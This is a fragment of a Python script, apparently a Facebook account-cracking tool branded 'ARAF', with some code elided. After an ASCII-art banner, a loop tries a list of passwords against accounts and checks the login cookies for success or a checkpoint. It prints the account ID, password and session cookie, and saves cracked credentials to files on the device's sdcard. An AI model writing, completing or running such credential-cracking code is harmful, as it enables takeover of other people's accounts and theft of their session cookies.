...
logo = (""""\033[132m
      ...
      dM.    `MMMMMMMb.       dM.    `MMMMMMM 
     ,MMb     MM    `Mb      ,MMb     MM    \ 
     d'YM.    MM     MM      d'YM.    MM      
    ,P `Mb    MM     MM     ,P `Mb    MM   ,  
    d'  YM.   MM    .M9     d'  YM.   MMMMMM  
   ,P   `Mb   MMMMMMM9'    ,P   `Mb   MM   `  
   d'    YM.  MM  \M\      d'    YM.  MM      
  ,MMMMMMMMb  MM   \M\    ,MMMMMMMMb  MM      
  d'      YM. MM    \M\   d'      YM. MM      
_dM_     _dMM_MM_    \M\_dM_     _dMM_MM_\033[1;37m\n""")
def ud():
    os.system('clear')
    jalan(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[ARAF-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ARAF-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[ARAF-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ARAF-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[ARAF] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
